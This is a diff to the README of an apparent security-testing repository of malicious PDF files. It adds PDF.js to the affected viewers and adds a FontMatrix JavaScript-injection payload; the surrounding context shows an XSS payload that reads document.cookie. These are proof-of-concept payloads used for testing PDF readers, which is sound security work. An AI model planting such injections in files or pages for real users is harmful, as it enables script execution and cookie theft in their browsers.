@@ -11,6 +11,7 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 - [PSPDFKit for Web](https://www.npmjs.com/package/pspdfkit) 2021.4.1 (~13k weekly downloads)
 - [Syncfusion ej2-pdfviewer](https://www.npmjs.com/package/@syncfusion/ej2-pdfviewer) 20.2.40 (~6.8k weekly downloads)
 - [React PDF viewer](https://www.npmjs.com/package/@react-pdf-viewer/core) 3.6.0 (~34k weekly downloads)
+- [PDF.js](https://www.npmjs.com/package/pdfjs-dist) <= 4.1.392 (~2 million weekly downloads)
 
 ## Payloads list
 
@@ -88,6 +89,12 @@ A list of crafted malicious PDF files to test the security of PDF readers and to
 /V (">'></div><details/open/ontoggle=confirm(document.cookie)></details>)
 ```
 
+### payload8.pdf
+
+**Line 49**. Try to run arbitrary Javascript injected via FontMatrix. It works on vulnerable PDF.js versions.
+```
+/FontMatrix [1 2 3 4 5 (1\); alert\('origin: '+window.origin+'\\npdf url: '+window.PDFViewerApplication.url)]
+```
 
 ___
 
